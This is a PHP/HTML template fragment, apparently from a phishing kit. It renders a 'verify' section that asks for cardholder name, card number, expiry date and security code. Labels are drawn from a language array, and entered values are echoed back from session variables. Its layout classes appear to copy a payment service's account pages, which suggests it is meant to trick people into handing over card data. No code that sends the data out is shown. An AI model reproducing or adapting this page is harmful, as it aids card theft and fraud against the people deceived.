<section class="flow-section mobile-section-edit  edit ">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?php echo $bhs['verify2']; ?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
            
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">                            
<h3 class="section-subtitle" id="nameLabel"><?php echo $bhs['verify3']; ?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" <?php if (!empty($_SESSION['fullname'])) echo $ccname;?> placeholder="<?php echo $bhs['verify4']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" <?php if (!empty($_SESSION['carta'])) echo $card;?> placeholder="<?php echo $bhs['verify5']; ?>">
  <input type="hidden" class="cc-brand" value="">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?php echo $bhs['verify6']; ?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?php echo $bhs['verify7']; ?>">
</div>
</div>
</div>
</div>
</div>